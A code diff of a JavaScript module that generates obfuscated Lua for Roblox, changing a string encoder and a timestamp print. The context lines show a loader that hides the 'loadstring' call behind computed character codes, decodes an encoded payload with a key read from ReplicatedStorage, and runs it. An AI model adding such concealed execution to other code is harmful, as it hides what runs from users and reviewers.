@@ -147,20 +147,17 @@ function GetNumberWithMath(num) {
 }
 
 // Encode Number to String Function
-function EncodeNumberToString(num, minLength = 26) {
+function EncodeNumberToString(num) {
   const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
   const base = alphabet.length;
   let result = "";
-  while (num > 0) {
-    const index = num % base;
+  num = BigInt(num);
+  while (num > 0n) {
+    const index = Number(num % BigInt(base));
     result = alphabet[index] + result;
-    num = Math.floor(num / base);
+    num = num / BigInt(base);
   }
-  while (result.length < minLength) {
-    const rand = Math.floor(Math.random() * base);
-    result += alphabet[rand];
-  }
-  return result;
+  return result || "a";
 }
 
 
@@ -223,8 +220,7 @@ export default {
       const time = `${date.getFullYear()}${pad(date.getMonth() + 1)}${pad(date.getDate())}${pad(date.getHours())}${pad(date.getMinutes())}${pad(date.getSeconds())}`;
       const script = `
       print("${EncodeNumberToString(time)}")
-      local function EncodeNumberToString(num, minLength) 	minLength = minLength or 26 	local alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" 	local base = #alphabet 	local result = "" 	while num > 0 do 		local index = (num % base) + 1 		result = result .. alphabet:sub(index, index) 		num = math.floor(num / base) 	end 	while #result < minLength do 		local rand = math.random(1, base) 		result = result .. alphabet:sub(rand, rand) 	end 	return result end
-      print(EncodeNumberToString(os.date("%Y%m%d%H%M")..string.format("%02d", (tonumber(os.date("%S")) + 1) % 60)))
+      print(os.date("%Y%m%d%H%M")..string.format("%02d", (tonumber(os.date("%S")) + 1) % 60))
       local function ${decodedStr}(encodedStr, key) local result = {} local parts = string.split(encodedStr, "/") for i = 1, #parts do local byte = tonumber(parts[i]) local k = key:byte(((i - 1) % #key) + 1) local decoded = (byte - k + 256) % 256 table.insert(result, string.char(decoded)) end return table.concat(result) end 
       local a = game local b = "GetService" local c = "ReplicatedStorage" local d = "Destroy" local ${objStr} = a[b](a, c)["${data.Name}"].Value
       local ${fnStr}="";for _, c in ipairs({${GetNumberWithMath(108)}, ${GetNumberWithMath(111)}, ${GetNumberWithMath(97)}, ${GetNumberWithMath(100)}, ${GetNumberWithMath(115)}, ${GetNumberWithMath(116)}, ${GetNumberWithMath(114)}, ${GetNumberWithMath(105)}, ${GetNumberWithMath(110)}, ${GetNumberWithMath(103)}}) do ${fnStr}=${fnStr}..string.char(c);end(getfenv()[${fnStr}] or _G[${fnStr}] or _ENV and _ENV[${fnStr}])(${decodedStr}("${encoded}", ${objStr}))()`;
